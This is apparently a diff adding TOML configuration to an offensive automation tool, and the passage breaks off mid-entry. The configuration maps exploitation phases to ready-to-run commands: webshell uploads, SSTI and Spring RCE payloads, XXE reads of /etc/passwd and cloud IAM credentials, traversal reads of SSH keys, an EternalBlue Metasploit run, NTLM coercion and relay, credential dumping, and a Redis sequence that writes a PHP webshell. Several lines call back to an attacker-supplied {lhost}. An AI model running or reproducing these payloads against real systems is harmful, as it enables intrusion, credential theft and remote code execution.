+[[capability.provider.operation]]
+name = 'Double Ext Upload'
+args = ['-sk', '-F', 'file=@{shell};;type=image/php', '-F', 'file=@shell.php.jpg', '{url}/upload.php']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Mime Spoof Upload'
+args = ['-sk', '-F', 'file=@{shell};type=image/jpeg', '{url}/upload.php']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Null Byte Bypass Upload'
+args = ['-sk', '-F', 'file=@shell.php%00.jpg', '{url}/upload.php']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'ASPX Shell Upload'
+args = ['-sk', '-F', 'file=@shell.aspx', '{url}/upload.aspx']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'JSP Shell Upload'
+args = ['-sk', '-F', 'file=@shell.jsp', '{url}/upload.jsp']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Upload Dir Probe'
+args = ['-sk', '{url}/uploads/']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Shell RCE Verify'
+args = ['-sk', '{url}/uploads/shell.php?cmd=id']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Shell Reverse Trigger'
+args = ['-sk', '{url}/uploads/shell.php?cmd=curl+http://{lhost}:{lport}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nc'
+[[capability.provider.operation]]
+name = 'Callback Listener'
+args = ['-lvnp', '9001']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'Upload Vulnerability Templates'
+args = ['-u', '{url}', '-tags', 'upload,rce', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'ffuf'
+[[capability.provider.operation]]
+name = 'Upload Path Fuzz'
+args = ['-u', '{url}/FUZZ', '-w', '/usr/share/seclists/Discovery/Web-Content/common.txt', '-mc', '200,201,204', '-t', '20']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'weevely'
+[[capability.provider.operation]]
+name = 'Shell Session Bind'
+args = ['{url}/uploads/shell.php', 'tsecpass']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'file'
+[[capability.provider.operation]]
+name = 'Shell Artifact Verify'
+args = ['{shell}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'WAF Bypass Polyglot Upload'
+args = ['-sk', '-F', 'file=@shell_polyglot.jpg', '{url}/upload.php']
+output = 'lines'
+network = true
+
+[[capability]]
+id = 'exploitation.ssti-rce'
+phase = 'exploitation'
+label = 'SSTI RCE'
+summary = 'Escalate template injection to remote code execution'
+inputs = [
+  { key = 'url', type = 'url', required = true },
+  { key = 'param', type = 'text', required = false, default = 'name' },
+]
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Jinja Probe Inject'
+args = ['-sk', '{url}?{param}=${{{{7*7}}}}']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Jinja RCE Inject'
+args = ['-sk', '{url}?{param}=${{{{config.__class__.__init__.__globals__[\'os\'].popen(\'id\').read()}}}}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Twig RCE Inject'
+args = ['-sk', '{url}?{param}={{{{[\'id\']|filter(\'system\')}}}}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Freemarker RCE Inject'
+args = ['-sk', '{url}?{param}=<#assign ex="freemarker.template.utility.Execute"?new()>${{ex("id")}}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Velocity RCE Inject'
+args = ['-sk', '{url}?{param}=#set($e="")#set($e=$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id"))']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'ERB RCE Inject'
+args = ['-sk', '{url}?{param}=<%= `id` %>']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Jinja Reverse Trigger'
+args = ['-sk', '{url}?{param}=${{{{config.__class__.__init__.__globals__[\'os\'].popen(\'curl http://{lhost}:9001\').read()}}}}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'tplmap'
+[[capability.provider.operation]]
+name = 'Tplmap Auto Exploit'
+args = ['-u', '{url}', '-d', '{param}=1', '--os-shell']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'tplmap'
+[[capability.provider.operation]]
+name = 'Tplmap Engine Detect'
+args = ['-u', '{url}', '-d', '{param}=1', '--engine-all']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nc'
+[[capability.provider.operation]]
+name = 'SSTI Callback Listener'
+args = ['-lvnp', '9001']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'SSTI Template Sweep'
+args = ['-u', '{url}', '-tags', 'ssti,rce', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Header SSTI Inject'
+args = ['-sk', '{url}', '-H', 'X-Forwarded-Host: ${{{{7*7}}}}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Body SSTI Inject'
+args = ['-sk', '{url}', '-d', '{param}=${{{{7*7}}}}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'ffuf'
+[[capability.provider.operation]]
+name = 'SSTI Param Fuzz'
+args = ['-u', '{url}?FUZZ=${{{{7*7}}}}', '-w', '/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt', '-ms', '49', '-t', '10']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'httpx'
+[[capability.provider.operation]]
+name = 'Post Exploit Tech Confirm'
+args = ['-u', '{url}', '-tech-detect', '-silent', '-nc']
+output = 'lines'
+network = true
+
+[[capability]]
+id = 'exploitation.xxe-ssrf-chain'
+phase = 'exploitation'
+label = 'XXE SSRF CHAIN'
+summary = 'Chain XXE into SSRF for internal access and file reads'
+inputs = [
+  { key = 'url', type = 'url', required = true },
+  { key = 'lhost', type = 'target', required = true },
+]
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'XXE File Read'
+args = ['-sk', '{url}', '-d', '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'XXE SSRF Internal'
+args = ['-sk', '{url}', '-d', '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'XXE Internal Port Scan'
+args = ['-sk', '{url}', '-d', '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">]><root>&xxe;</root>']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'XXE OOB Callback'
+args = ['-sk', '{url}', '-d', '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{lhost}:8888/oob">]><root>&xxe;</root>']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'XXE Parameter Entity OOB'
+args = ['-sk', '{url}', '-d', '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://{lhost}:8888/xxe.dtd">%remote;]><root/>']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'XInclude File Read'
+args = ['-sk', '{url}', '-d', '<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></root>']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'SVG XXE Upload Chain'
+args = ['-sk', '-F', 'file=@xxe.svg', '{url}/upload.php']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'DOCX XXE Upload Chain'
+args = ['-sk', '-F', 'file=@xxe.docx', '{url}/upload.php']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nc'
+[[capability.provider]]
+operation_placeholder = true
+[[capability.provider.operation]]
+name = 'OOB Listener'
+args = ['-lvnp', '8888']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'tcpdump'
+[[capability.provider.operation]]
+name = 'OOB Traffic Confirm'
+args = ['-i', 'eth0', '-nn', '-c', '10', 'port', '8888']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'XXE Template Sweep'
+args = ['-u', '{url}', '-tags', 'xxe,ssrf', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'SOAP XXE Inject'
+args = ['-sk', '{url}', '-H', 'SOAPAction: x', '-H', 'Content-Type: text/xml', '-d', '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><soapenv:Envelope><soapenv:Body>&xxe;</soapenv:Body></soapenv:Envelope>']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'IMDS Credential via SSRF'
+args = ['-sk', '{url}', '-d', '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><root>&xxe;</root>']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Cloud Metadata Chain via SSRF'
+args = ['-sk', '{url}/fetch?url=http://169.254.169.254/latest/meta-data/']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Redis SSRF Write Probe'
+args = ['-sk', '{url}/fetch?url=gopher://127.0.0.1:6379/_%2A1%0D%0A%244%0D%0Ainfo%0D%0A']
+output = 'lines'
+network = true
+
+[[capability]]
+id = 'exploitation.path-traversal-rce'
+phase = 'exploitation'
+label = 'PATH TRAVERSAL RCE'
+summary = 'Escalate path traversal to sensitive file access and RCE'
+inputs = [
+  { key = 'url', type = 'url', required = true },
+  { key = 'param', type = 'text', required = false, default = 'file' },
+]
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Traversal Passwd Read'
+args = ['-sk', '{url}?{param}=../../../../etc/passwd']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Traversal Encoded Bypass'
+args = ['-sk', '{url}?{param}=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Traversal Double Encode'
+args = ['-sk', '{url}?{param}=%252e%252e%252fetc%252fpasswd']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Traversal Null Byte'
+args = ['-sk', '{url}?{param}=../../../../etc/passwd%00']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Traversal Abs Path'
+args = ['-sk', '{url}?{param}=/etc/passwd']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Traversal Log Read'
+args = ['-sk', '{url}?{param}=../../../../var/log/apache2/access.log']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'LFI Log Poison RCE'
+args = ['-sk', '{url}?{param}=../../../../var/log/apache2/access.log&cmd=id']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'PHP Filter RCE Chain'
+args = ['-sk', '{url}?{param}=php://filter/convert.base64-encode/resource=/etc/passwd']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'PHP Input RCE'
+args = ['-sk', '{url}?{param}=php://input', '-d', '<?php system("id"); ?>']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'LFI Template Sweep'
+args = ['-u', '{url}', '-tags', 'lfi,traversal', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'ffuf'
+[[capability.provider.operation]]
+name = 'Traversal Param Fuzz'
+args = ['-u', '{url}?{param}=FUZZ', '-w', '/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt', '-mc', '200', '-t', '10']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Windows Traversal Read'
+args = ['-sk', '{url}?{param}=..%2f..%2f..%2fwindows%2fwin.ini']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Session File RCE Probe'
+args = ['-sk', '{url}?{param}=../../../../var/lib/php/sessions/sess_test123']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'SSH Key Exfil Probe'
+args = ['-sk', '{url}?{param}=../../../../root/.ssh/id_rsa']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Proc Environ Exfil'
+args = ['-sk', '{url}?{param}=../../../../proc/self/environ']
+output = 'lines'
+network = true
+
+[[capability]]
+id = 'exploitation.spring-rce'
+phase = 'exploitation'
+label = 'SPRING RCE'
+summary = 'Exploit Spring Boot and Spring4Shell vectors'
+inputs = [
+  { key = 'url', type = 'url', required = true },
+  { key = 'lhost', type = 'target', required = true },
+]
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Actuator Gateway Probe'
+args = ['-sk', '{url}/actuator/gateway/routes']
+output = 'json'
+network = true
+[[capability.provider.operation]]
+name = 'Actuator Env Probe'
+args = ['-sk', '{url}/actuator/env']
+output = 'json'
+network = true
+[[capability.provider.operation]]
+name = 'Actuator Heap Dump'
+args = ['-sk', '-o', '/tmp/heap.bin', '{url}/actuator/heapdump']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Spring4Shell POST'
+args = ['-sk', '{url}', '-d', 'class.module.classLoader.URLs[0]=x&r=exec("id")']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'SpEL RCE Inject'
+args = ['-sk', '{url}', '-d', 'expression=T(java.lang.Runtime).getRuntime().exec("id")']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Cloud Function Env Pull'
+args = ['-sk', '{url}/actuator/env', '|', 'grep', 'credentials']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'Spring Templates Sweep'
+args = ['-u', '{url}', '-tags', 'spring,actuator', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'strings'
+[[capability.provider.operation]]
+name = 'Heap Creds Extract'
+args = ['/tmp/heap.bin']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Eureka Probe'
+args = ['-sk', '{url}/eureka/apps']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Jolokia RCE Probe'
+args = ['-sk', '{url}/jolokia/read/java.lang:type=Runtime']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'httpx'
+[[capability.provider.operation]]
+name = 'Spring Tech Confirm'
+args = ['-u', '{url}', '-tech-detect', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Gateway RCE Write'
+args = ['-sk', '-X', 'POST', '{url}/actuator/gateway/routes/ts', '-H', 'Content-Type: application/json', '-d', '{"id":"ts","filters":[{"name":"AddResponseHeader","args":{"name":"X","value":"${{T(java.lang.Runtime).getRuntime().exec(\\"id\\")}}"}}],"uri":"http://example.com"}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Gateway Refresh Trigger'
+args = ['-sk', '-X', 'POST', '{url}/actuator/gateway/refresh']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Actuator Full Enum'
+args = ['-sk', '{url}/actuator']
+output = 'json'
+network = true
+[[capability.provider]]
+binary = 'ffuf'
+[[capability.provider.operation]]
+name = 'Actuator Path Fuzz'
+args = ['-u', '{url}/actuator/FUZZ', '-w', '/usr/share/seclists/Discovery/Web-Content/spring-boot.txt', '-mc', '200', '-t', '10']
+output = 'lines'
+network = true
+
+[[capability]]
+id = 'exploitation.preauth-proxy-rce'
+phase = 'exploitation'
+label = 'PREAUTH PROXY RCE'
+summary = 'Exploit unauthenticated proxy and edge device RCE vectors'
+inputs = [
+  { key = 'rhost', type = 'target', required = true },
+  { key = 'lhost', type = 'target', required = true },
+]
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Exchange Autodiscover Probe'
+args = ['-sk', 'https://{rhost}/autodiscover/autodiscover.json']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'ProxyShell SSRF Probe'
+args = ['-sk', 'https://{rhost}/autodiscover/autodiscover.json?Email=autodiscover/autodiscover.json%3F%3fEmail=ab@cd.com']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'ProxyShell PowerShell Probe'
+args = ['-sk', 'https://{rhost}/mapi/nspi/']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'ProxyLogon SSRF Probe'
+args = ['-sk', 'https://{rhost}/ecp/default.aspx']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'Exchange Template Sweep'
+args = ['-u', '{rhost}', '-tags', 'exchange,proxylogon,proxyshell', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Fortinet CVE Probe'
+args = ['-sk', 'https://{rhost}/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Citrix Path Traversal Probe'
+args = ['-sk', 'https://{rhost}/vpns/portal/scripts/newlogin.pl?wrapper=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Ivanti CVE Probe'
+args = ['-sk', 'https://{rhost}/dana-na/auth/url_default/welcome.cgi']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'Edge Device Template Sweep'
+args = ['-u', '{rhost}', '-tags', 'fortinet,citrix,ivanti,vpn', '-severity', 'critical', '-silent', '-nc']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Zimbra SSRF Probe'
+args = ['-sk', 'https://{rhost}/proxy?target=http://169.254.169.254/latest/meta-data/']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Atlassian Confluence OGNL Probe'
+args = ['-sk', '{rhost}/pages/doenterpagevariables.action']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nmap'
+[[capability.provider.operation]]
+name = 'Edge Service Version Sweep'
+args = ['-sV', '-p', '443,4443,8443', '{rhost}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'sslscan'
+[[capability.provider.operation]]
+name = 'Edge TLS Audit'
+args = ['{rhost}:443']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Admin Panel Default Cred Probe'
+args = ['-sk', 'https://{rhost}/remote/login']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nuclei'
+[[capability.provider.operation]]
+name = 'Preauth Critical List Sweep'
+args = ['-l', '/tmp/urls.txt', '-tags', 'pre-auth', '-severity', 'critical', '-silent', '-nc']
+output = 'lines'
+network = true
+
+[[capability]]
+id = 'exploitation.smb-rce'
+phase = 'exploitation'
+label = 'SMB RCE'
+summary = 'Exploit SMB vectors for remote code execution'
+inputs = [
+  { key = 'rhost', type = 'target', required = true },
+  { key = 'lhost', type = 'target', required = true },
+  { key = 'username', type = 'username', required = false, default = '' },
+  { key = 'password', type = 'password', required = false, default = '' },
+]
+[[capability.provider]]
+binary = 'nmap'
+[[capability.provider.operation]]
+name = 'MS17-010 Script Check'
+args = ['-p', '445', '--script', 'smb-vuln-ms17-010', '{rhost}']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'SMB DoublePulsar Check'
+args = ['-p', '445', '--script', 'smb-double-pulsar-backdoor', '{rhost}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'msfconsole'
+[[capability.provider.operation]]
+name = 'Eternal Blue Exploit'
+args = ['-q', '-x', 'use exploit/windows/smb/ms17_010_eternalblue', '-x', 'set RHOSTS {rhost}', '-x', 'set LHOST {lhost}', '-x', 'run', '-x', 'exit']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'SMB Empty Cred Probe'
+args = ['smb', '{rhost}', '-u', 'guest', '-p', '']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-psexec'
+[[capability.provider.operation]]
+name = 'Psexec RCE Chain'
+args = ['{rhost}/{username}:{password}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-smbexec'
+[[capability.provider.operation]]
+name = 'Smbexec RCE Chain'
+args = ['{rhost}/{username}:{password}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider]]
+operation_placeholder2 = true
+[[capability.provider.operation]]
+name = 'SMB Command Exec'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-x', 'whoami']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nmap'
+[[capability.provider]]
+name_placeholder = true
+[[capability.provider.operation]]
+name = 'SMB Vuln Full Sweep'
+args = ['-p', '445', '--script', 'smb-vuln-*', '{rhost}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-smbclient'
+[[capability.provider.operation]]
+name = 'SMB Session Verify'
+args = ['{rhost}/{username}:{password}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'PsExec Module Exec'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'psexec', '-o', 'COMMAND=whoami']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'evil-winrm'
+[[capability.provider.operation]]
+name = 'Post SMB WinRM Shell'
+args = ['-i', '{rhost}', '-u', '{username}', '-p', '{password}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nmap'
+[[capability.provider.operation]]
+name = 'SMB Signing Check'
+args = ['-p', '445', '--script', 'smb-security-mode', '{rhost}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'crackmapexec'
+[[capability.provider.operation]]
+name = 'Compat Exec Test'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-x', 'hostname']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'msfconsole'
+[[capability.provider.operation]]
+name = 'PsExec Module Msf'
+args = ['-q', '-x', 'use exploit/windows/smb/psexec', '-x', 'set RHOSTS {rhost}', '-x', 'set SMBUser {username}', '-x', 'set SMBPass {password}', '-x', 'run', '-x', 'exit']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'SMB Post RCE Verify'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-x', 'ipconfig']
+output = 'lines'
+network = true
+
+[[capability]]
+id = 'exploitation.spooler-rce'
+phase = 'exploitation'
+label = 'SPOOLER RCE'
+summary = 'Exploit print spooler and PrintNightmare-class vectors'
+inputs = [
+  { key = 'rhost', type = 'target', required = true },
+  { key = 'lhost', type = 'target', required = true },
+  { key = 'username', type = 'username', required = true },
+  { key = 'password', type = 'password', required = true },
+]
+[[capability.provider]]
+binary = 'rpcdump'
+[[capability.provider.operation]]
+name = 'Spooler Service Detect'
+args = ['{rhost}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Spooler Module Check'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'spooler']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-printbugger'
+[[capability.provider.operation]]
+name = 'Printer Bug Coerce'
+args = ['{rhost}/{username}:{password}', '{lhost}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'coercer'
+[[capability.provider.operation]]
+name = 'Full Coerce Sweep'
+args = ['coerce', '--listener-ip', '{lhost}', '--target-ip', '{rhost}', '-u', '{username}', '-p', '{password}', '-v']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-ntlmrelayx'
+[[capability.provider.operation]]
+name = 'Relay to SMB RCE'
+args = ['-t', '{rhost}', '-smb2support', '-i']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-ntlmrelayx'
+[[capability.provider.operation]]
+name = 'Relay to LDAP Dump'
+args = ['-t', 'ldap://{rhost}', '--no-validate']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-psexec'
+[[capability.provider.operation]]
+name = 'Nightmare DLL Chain'
+args = ['{rhost}/{username}:{password}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-wmiexec'
+[[capability.provider.operation]]
+name = 'Spooler Service Check Shell'
+args = ['{rhost}/{username}:{password}', 'sc query spooler']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-wmiexec'
+[[capability.provider.operation]]
+name = 'Driver Dir Enum Shell'
+args = ['{rhost}/{username}:{password}', 'dir C:\\Windows\\System32\\spool\\drivers']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nmap'
+[[capability.provider]]
+name_placeholder2 = true
+[[capability.provider.operation]]
+name = 'RPC Endpoint Scan'
+args = ['-p', '135,445,631', '--script', 'rpcinfo', '{rhost}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Post Spooler Exec Verify'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-x', 'whoami']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'responder'
+[[capability.provider.operation]]
+name = 'Catch Coerced Auth'
+args = ['-I', 'eth0', '-v']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'hashcat'
+[[capability.provider.operation]]
+name = 'Coerced NetNTLMv2 Crack'
+args = ['-m', '5600', '-a', '0', '/tmp/coerced.hash', '/usr/share/wordlists/rockyou.txt', '--potfile-disable']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'crackmapexec'
+[[capability.provider.operation]]
+name = 'Compat Spooler Check'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'spooler']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'impacket-secretsdump'
+[[capability.provider.operation]]
+name = 'Post Spooler Cred Dump'
+args = ['{rhost}/{username}:{password}']
+output = 'lines'
+network = true
+
+[[capability]]
+id = 'exploitation.redis-rce'
+phase = 'exploitation'
+label = 'REDIS RCE'
+summary = 'Exploit unauthenticated Redis for RCE and file access'
+inputs = [
+  { key = 'rhost', type = 'target', required = true },
+  { key = 'lhost', type = 'target', required = true },
+]
+[[capability.provider]]
+binary = 'redis-cli'
+[[capability.provider.operation]]
+name = 'Unauth Ping Probe'
+args = ['-h', '{rhost}', 'ping']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Info Version Pull'
+args = ['-h', '{rhost}', 'info', 'server']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Config Dir Pull'
+args = ['-h', '{rhost}', 'config', 'get', 'dir']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Config Dir Set Webroot'
+args = ['-h', '{rhost}', 'config', 'set', 'dir', '/var/www/html/']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Config Filename Set Shell'
+args = ['-h', '{rhost}', 'config', 'set', 'dbfilename', 'shell.php']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Shell Payload Write'
+args = ['-h', '{rhost}', 'set', 'x', '<?php system($_GET[0]); ?>']
+output = 'lines'
+network = true
+[[capability.provider.operation]]
+name = 'Save Trigger Shell Drop'
+args = ['-h', '{rhost}', 'save']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Webshell RCE Verify'
+args = ['-sk', 'http://{rhost}/shell.php?0=id']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'redis-cli'
+[[capability.provider.operation]]
+name = 'Module Load RCE'
+args = ['-h', '{rhost}', 'module', 'load', '/tmp/exp.so']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'redis-cli'
+[[capability.provider.operation]]
+name = 'Module Exec RCE'
